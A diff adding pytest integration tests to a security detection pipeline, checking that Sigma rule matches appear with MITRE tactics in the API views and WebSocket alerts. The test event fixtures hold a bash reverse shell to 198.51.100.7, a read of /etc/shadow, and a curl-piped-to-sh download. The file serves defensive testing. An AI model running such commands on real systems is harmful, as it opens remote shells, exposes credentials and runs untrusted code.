@@ -18,6 +18,7 @@ from httpx import ASGITransport, AsyncClient
 from sqlalchemy import select
 from sqlalchemy.ext.asyncio import AsyncSession, async_sessionmaker, create_async_engine
 
+from app.api.v1.endpoints.websocket import manager as ws_manager
 from app.connectors.syslog_receiver import SyslogReceiver
 from app.core.database import get_db
 from app.engine.sigma_engine import SigmaEngine
@@ -32,6 +33,7 @@ from app.services.bundled_rules import import_bundled_rules
 from app.services.event_persister import event_persister
 from app.services.normalizers.pipeline import NormalizerPipeline
 from app.services.sigma_consumer import sigma_consumer
+from app.services.ws_broadcaster import websocket_broadcaster
 
 SSH_FAILED_ROOT_RULE = "b67d5827-73fd-46a2-a8fd-d15594ac491e"
 REVERSE_SHELL_RULE = "ec09518a-b81b-4fe5-9bdf-dd9fc96c01e2"
@@ -70,6 +72,7 @@ async def pipeline(tmp_path: Path) -> AsyncGenerator[tuple[InMemoryQueue, async_
 
     with (
         patch("app.core.database.AsyncSessionLocal", session_factory),
+        patch("app.services.event_persister.AsyncSessionLocal", session_factory),
         patch("app.services.alert_manager.aioredis") as valkey,
         patch("app.api.v1.endpoints.webhook_ingest.check_webhook_source_rate_limit",
               new=AsyncMock(return_value=True)),
@@ -173,3 +176,118 @@ async def test_event_that_matches_no_rule_is_stored_without_detection(pipeline) 
 
     assert len(await _rows(session_factory, Event)) == 1
     assert await _rows(session_factory, Detection) == []
+
+
+# ── Pipeline detections in the Detections and Overview views ─────────────────
+
+# No timestamp: the events get the time of receipt, inside every Overview range.
+_REVERSE_SHELL = {
+    "host": "app02", "user": "www-data",
+    "command_line": "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'",
+}
+_SHADOW_READ = {"host": "db01", "user": "mallory", "command_line": "sudo cat /etc/shadow"}
+_DOWNLOAD_TO_SHELL = {"host": "web01", "command_line": "curl http://198.51.100.7/x.sh | sh"}
+
+
+async def _publish_webhook_events(queue: InMemoryQueue, *events: dict) -> None:
+    for event in events:
+        await queue.publish(Topic.RAW_WEBHOOK, {**event, "_webhook_source": "custom-source"})
+    await queue.drain(timeout=10)
+
+
+@pytest.fixture
+async def api(pipeline, analyst_headers) -> AsyncGenerator[tuple[InMemoryQueue, AsyncClient], None]:
+    """HTTP client (analyst) on the database the pipeline writes to."""
+    queue, session_factory = pipeline
+
+    async def _override_get_db() -> AsyncGenerator[AsyncSession, None]:
+        async with session_factory() as session:
+            yield session
+
+    app.dependency_overrides[get_db] = _override_get_db
+    try:
+        async with AsyncClient(
+            transport=ASGITransport(app=app), base_url="http://test", headers=analyst_headers,
+        ) as client:
+            yield queue, client
+    finally:
+        app.dependency_overrides.clear()
+
+
+async def test_pipeline_detection_stores_the_tactic_name(pipeline) -> None:
+    queue, session_factory = pipeline
+    await _publish_webhook_events(queue, _REVERSE_SHELL, _DOWNLOAD_TO_SHELL)
+
+    detections = {d.host: d for d in await _rows(session_factory, Detection)}
+    assert (detections["app02"].tactic, detections["app02"].tactic_id) == ("Execution", "TA0002")
+    assert (detections["web01"].tactic, detections["web01"].tactic_id) == (
+        "Command and Control", "TA0011",
+    )
+
+
+async def test_pipeline_detections_show_in_overview_tactics(api) -> None:
+    queue, client = api
+    await _publish_webhook_events(queue, _REVERSE_SHELL, _SHADOW_READ, _DOWNLOAD_TO_SHELL)
+
+    resp = await client.get("/api/v1/overview/tactics")
+    assert resp.status_code == 200
+    assert {row["tactic"]: row["count"] for row in resp.json()} == {
+        "Execution": 1, "Credential Access": 1, "Command and Control": 1,
+    }
+
+
+async def test_pipeline_detections_show_in_overview_heatmap(api) -> None:
+    queue, client = api
+
+    resp = await client.get("/api/v1/overview/coverage/heatmap")
+    assert all(cell["covered"] == 0 for row in resp.json() for cell in row["cells"])
+
+    await _publish_webhook_events(queue, _REVERSE_SHELL, _SHADOW_READ)
+
+    resp = await client.get("/api/v1/overview/coverage/heatmap")
+    assert resp.status_code == 200
+    covered = {
+        (row["technique_id"], cell["tactic"]): cell["covered"]
+        for row in resp.json() for cell in row["cells"] if cell["covered"]
+    }
+    # T1059.004 under Execution, T1003.008 under Credential Access
+    assert covered == {("T1059", "EXEC"): 1, ("T1003", "CRED"): 1}
+
+
+async def test_pipeline_detection_is_listed_with_all_table_fields(api) -> None:
+    queue, client = api
+    await _publish_webhook_events(queue, _REVERSE_SHELL, _SHADOW_READ)
+
+    resp = await client.get("/api/v1/detections", params={"tactic": "execution"})
+    assert resp.status_code == 200
+    (row,) = resp.json()["items"]
+    assert row["name"] == "Reverse Shell Command Line"
+    assert row["score"] > 0
+    assert row["severity"] == "high"
+    assert row["technique_id"] == "T1059.004"
+    assert row["technique_name"]
+    assert row["tactic"] == "Execution"
+    assert row["tactic_id"] == "TA0002"
+    assert row["host"] == "app02"
+    assert row["status"] == "active"
+    assert row["time"]
+
+    resp = await client.get("/api/v1/overview/recent-detections")
+    assert {d["tactic"] for d in resp.json()} == {"Execution", "Credential Access"}
+
+
+async def test_pipeline_detection_is_broadcast_to_websocket_clients(pipeline) -> None:
+    queue, _ = pipeline
+    with patch.object(ws_manager, "broadcast", new=AsyncMock()) as broadcast:
+        await websocket_broadcaster(queue)
+        await _publish_webhook_events(queue, _REVERSE_SHELL)
+
+    broadcast.assert_awaited_once()
+    message = broadcast.await_args.args[0]
+    assert message["type"] == "alert"
+    assert message["data"]["rule_title"] == "Reverse Shell Command Line"
+    assert message["data"]["host"] == "app02"
+    assert message["data"]["level"] == "high"
+    assert message["data"]["technique_ids"] == ["T1059.004"]
+    assert message["data"]["tactic_ids"] == ["TA0002"]
+    assert message["data"]["score"] > 0
